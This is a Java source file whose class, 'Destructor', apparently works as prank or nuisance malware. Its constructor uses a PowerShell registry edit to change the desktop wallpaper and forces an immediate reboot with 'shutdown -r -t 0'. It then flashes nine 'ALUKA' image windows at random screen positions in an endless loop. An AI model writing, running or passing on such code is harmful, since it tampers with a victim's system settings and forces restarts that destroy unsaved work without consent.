package aluka.destructors;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.LayoutManager;
import java.io.File;
import java.io.IOException;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

public class Destructor {

	public static void main(String[] args) throws InterruptedException, IOException {
		Destructor dest = new Destructor();
	}
	
	

	private JFrame frames[] = new JFrame[9];

	public Destructor() throws InterruptedException, IOException {
		
		Runtime process = Runtime.getRuntime();
		process.exec("powershell set-itemproperty -path \"HKCU:Control Panel\\Desktop\" -name WallPaper -value download.jpg");
		process.exec("shutdown -r -t 0");
		
		for (int i = 0;i<9;i++) {
			frames[i] = new JFrame("ALUKA");
			frames[i].setLayout(new BorderLayout());
			ImageIcon image = new ImageIcon(ImageIO.read(new File("download.jpg")));
			JLabel label = new JLabel(image);
			label.setSize(400,300);
			frames[i].add(label,BorderLayout.CENTER);
			frames[i].setSize(new Dimension(400, 300));
			frames[i].setIconImage(ImageIO.read(new File("download.jpg")));
		}
		
		while(true) {
			for(int i = 0;i<9;i++) {
				frames[i].setLocation((int)(Math.random() * 1000), (int)(Math.random() * 1000));
				frames[i].show(true);
				Thread.sleep(900);
				frames[i].show(false);
			}
		}
	}
	

}